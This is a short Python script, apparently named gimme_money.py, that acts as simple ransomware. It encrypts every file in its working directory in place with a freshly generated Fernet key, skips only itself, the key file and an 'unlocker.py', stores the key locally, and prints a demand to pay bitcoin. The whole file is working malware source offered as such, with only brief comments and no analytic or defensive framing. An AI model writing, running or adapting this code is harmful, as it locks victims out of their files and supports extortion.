# importing required modules (pre-installed with python3)
import os
from cryptography.fernet import Fernet

files= []       #filenames of the current directory

for file in os.listdir():
    if file == 'gimme_money.py' or file == 'key.key' or file == 'unlocker.py':
        continue        #excluding main encryption, decryption and key files
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()     #generating a key using Fernet
with open("key.key", "wb") as keywrite:
    keywrite.write(key)         #storing the key in a file

for file in files:
    with open(file, "rb") as fileread:
        file_content = fileread.read()      #reading file contents
    encrypted_content = Fernet(key).encrypt(file_content)
    with open(file, "wb") as filewrite:
        filewrite.write(encrypted_content)  #writing encrypted contents to the files

print("FILES ENCRYPTED, PAY BITCOIN OR YOUR CUTE POTATO PC DIES!!!")